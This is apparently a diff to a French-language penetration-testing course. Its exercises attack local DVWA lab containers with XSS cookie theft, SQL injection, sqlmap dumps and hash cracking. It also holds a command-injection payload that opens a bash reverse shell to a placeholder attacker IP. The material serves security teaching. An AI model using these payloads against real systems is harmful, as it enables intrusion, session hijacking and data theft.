@@ -9,7 +9,7 @@
 - Distinguer les profils d'attaquants
 - Cartographier les attaques (phishing, DDoS, SQLi, XSS) aux techniques ATT&CK
 - Prendre en main nmap, Metasploit, Wireshark
-- Exploiter les 4 failles web sur DVWA : XSS reflété/stocké, CSRF, SQLi, command injection
+- Exploiter les 4 failles web sur DVWA : Reflected XSS, Stored XSS, CSRF, SQLi, Command Injection
 
 ---
 
@@ -275,6 +275,8 @@ nmap -sV -p 8080 localhost | tee nmap_dvwa.txt
 ### Étape 2 — Énumération gobuster
 
 ```bash
+# Toujours dans ~/cours-hacking/jour-1/labs/
+cd ~/cours-hacking/jour-1/labs
 gobuster dir -u http://localhost:8080 \
   -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
 # /login.php (Status: 200)
@@ -311,9 +313,9 @@ curl -s -c /tmp/dvwa_cookie.txt \
 
 ### Contexte technique
 
-Le XSS reflété injecte du code dans l'URL, exécuté immédiatement. Le XSS stocké persiste en base de données. Dans un vrai pentest, on montre les deux car l'impact diffère : le reflété cible un utilisateur, le stocké toutes les visites.
+Reflected XSS injecte du code dans l'URL, exécuté immédiatement. Stored XSS persiste en base de données. Dans un vrai pentest, on montre les deux car l'impact diffère : Reflected cible un utilisateur, Stored toutes les visites.
 
-### Étape 1 — XSS Reflété
+### Étape 1 — Reflected XSS
 
 Dans DVWA → **XSS (Reflected)** → champ "What's your name?" :
 
@@ -337,7 +339,9 @@ python3 -m http.server 8000
 
 L'écouteur reçoit : `GET /?cookie=PHPSESSID=abc123...` → cookie volé.
 
-### Étape 3 — XSS Stocké
+Retournez dans le **Terminal 1** (écouteur HTTP) pour confirmer.
+
+### Étape 3 — Stored XSS
 
 DVWA → **XSS (Stored)** :
 ```
@@ -361,6 +365,8 @@ Message: <script>alert('Stored XSS')</script>
 La requête `SELECT first_name, last_name FROM users WHERE user_id = '$id'` devient `WHERE user_id = '1' OR '1'='1' #'` → retourne tous les utilisateurs. sqlmap automatise l'extraction complète.
 
 ### Étape 1 — Test manuel
+
+**Important :** remplacez `XXXX` par votre PHPSESSID. Pour l'obtenir : Firefox → DVWA → F12 → Storage → Cookies → copier la valeur de `PHPSESSID`.
 
 ```bash
 curl -s -b "PHPSESSID=XXXX;security=low" \
@@ -437,7 +443,7 @@ ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
 ```
 
-**Checkpoint :** Shell `www-data` obtenu sur netcat.
+**Checkpoint :** Retournez dans le **Terminal 1** (netcat) : une connexion entrante apparaît, suivie d'un prompt shell. Tapez `whoami` → `www-data`.
 
 ---
 
@@ -585,6 +591,8 @@ Sortie attendue :
 #### Méthode 1 : john the ripper
 
 ```bash
+cd ~/cours-hacking/jour-1/labs
+
 # Préparer le fichier de hashs
 cat > hashes.txt << 'EOF'
 admin:5f4dcc3b5aa765d61d8327deb882cf99
@@ -631,6 +639,8 @@ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
 ### Étape 4 — Extraire le flag caché
 
 ```bash
+cd ~/cours-hacking/jour-1/labs
+
 # Dans la table products, un champ secret_flag existe
 sqlmap -u "http://localhost:8083/?page=search&id=1" \
   -T products -C name,secret_flag --dump --batch
